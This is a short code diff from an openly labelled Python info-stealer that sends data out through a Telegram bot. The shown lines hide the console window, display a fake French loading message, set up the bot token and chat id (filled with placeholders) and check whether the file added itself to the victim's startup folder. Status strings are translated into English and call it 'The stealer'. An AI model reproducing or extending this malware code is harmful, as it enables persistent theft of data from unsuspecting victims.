@@ -25,8 +25,8 @@ ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 print("Chargement...\nCette opération peut durer 1 à 2 minutes")
 
-BOT_TOKEN = ''
-CHAT_ID = ''
+BOT_TOKEN = 'Your bot token here'
+CHAT_ID = 'Your chat id here'
 
 bot = Bot(token=BOT_TOKEN)
 user = os.getlogin()
@@ -43,9 +43,9 @@ print(f"Téléchargement des modules vers {file_location}...")
 filename = os.path.basename(__file__)
 
 if os.path.exists(startup_path + filename):
-    Added_to_startup = "Le fichier a bien été ajouté au déarrage automatique du pc de la victime"
+    Added_to_startup = "The stealer successfully added to victim's pc startup"
 else:
-    Added_to_startup = "Le fichier n'a pas réussi à s'ajouter au démarrage automatique du pc de la victime"
+    Added_to_startup = "The stealer failed to add to victim's pc startup"
 
 how_to_use_EG = r"""
                         ______________________
